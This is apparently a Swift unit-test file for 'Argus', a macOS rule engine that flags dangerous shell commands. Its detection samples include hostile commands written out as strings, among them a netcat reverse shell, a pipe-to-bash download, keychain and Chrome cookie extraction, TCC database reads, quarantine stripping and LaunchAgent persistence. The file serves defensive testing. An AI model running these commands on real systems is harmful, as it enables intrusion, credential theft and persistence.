import XCTest
@testable import Argus

final class RuleEngineTests: XCTestCase {

    /// One representative, safe-to-construct sample per rule in the catalog.
    /// Each command below never actually executes anything harmful — these
    /// strings are only ever run through `RuleEngine.evaluate`, never `Process`.
    private static let positiveSamples: [(rule: String, command: String)] = [
        ("AppleScript privilege escalation",
         #"osascript -e 'do shell script "id" with administrator privileges'"#),
        ("Pipe-to-interpreter download",
         "curl -sSL https://get.example.com/install.sh | bash"),
        ("Base64-obfuscated shell",
         "echo cGF5bG9hZA== | base64 -d | sh"),
        ("Gatekeeper quarantine strip",
         "xattr -d com.apple.quarantine /Applications/Foo.app"),
        ("Ad-hoc code signature removal",
         "codesign --remove-signature /Applications/Foo.app"),
        ("LaunchAgent persistence",
         "launchctl load /Users/mark/Library/LaunchAgents/com.foo.helper.plist"),
        ("Login Item persistence",
         "plutil -convert xml1 /Users/mark/Library/Preferences/com.apple.LoginItems.plist"),
        ("Keychain credential access",
         #"security find-generic-password -w -s "MyService""#),
        ("Browser cookie/session store access",
         #"sqlite3 "/Users/mark/Library/Application Support/Google/Chrome/Default/Cookies" "select * from cookies""#),
        ("TCC database tampering",
         "sqlite3 /Users/mark/Library/Application Support/com.apple.TCC/TCC.db \"select * from access\""),
        ("User/account enumeration",
         "dscl . -list /Users"),
        ("Sensitive file discovery sweep",
         "find / -name *.pem"),
        ("SIP / Gatekeeper status probing",
         "csrutil status"),
        ("Reverse shell primitive",
         "nc -e /bin/sh 10.0.0.5 4444"),
        ("Piped credential to sudo",
         "echo mypassword | sudo -s"),
        ("Unsigned profile install",
         "profiles install -type=configuration -path=/tmp/x.mobileconfig"),
        ("Accessibility-driven keystroke injection",
         #"osascript -e 'tell application "System Events" to keystroke "hello"'"#),
        ("AMFI / kernel protection toggle",
         "nvram boot-args=amfi_get_out_of_my_way=0x1"),
        ("Curl to raw IP endpoint",
         "curl -s http://45.33.32.156:8080/payload"),
        ("Hidden LaunchAgent write",
         "cp helper.plist /Users/mark/Library/.hidden/LaunchAgents/com.foo.helper.plist"),
    ]

    private static let benignSamples: [String] = [
        "ls -la /Applications",
        "/usr/bin/vim /etc/hosts",
        "git status",
        "npm install",
        "python3 script.py",
        "curl -s https://api.github.com/repos/anthropics/claude-code",
        "osascript -e 'return 1'",
        "ps aux",
        "brew install wget",
        "/bin/ps -axww -o pid,ppid,command",
    ]

    func testEveryRuleHasACoveringSample() {
        let coveredNames = Set(Self.positiveSamples.map(\.rule))
        let catalogNames = Set(RuleEngine.catalog.map(\.name))
        XCTAssertEqual(coveredNames, catalogNames,
                        "positiveSamples in this test must cover exactly the rules in RuleEngine.catalog")
    }

    func testPositiveSamplesMatchTheirRule() {
        for sample in Self.positiveSamples {
            let matches = RuleEngine.evaluate(sample.command)
            XCTAssertTrue(matches.contains { $0.name == sample.rule },
                          "expected rule '\(sample.rule)' to match: \(sample.command)")
        }
    }

    func testBenignCommandsNeverMatch() {
        for command in Self.benignSamples {
            let matches = RuleEngine.evaluate(command)
            XCTAssertTrue(matches.isEmpty,
                          "expected no rule to match benign command '\(command)', got: \(matches.map(\.name))")
        }
    }

    func testCatalogRuleNamesAreUnique() {
        let names = RuleEngine.catalog.map(\.name)
        XCTAssertEqual(names.count, Set(names).count, "duplicate rule names would break allowlist scoping")
    }
}
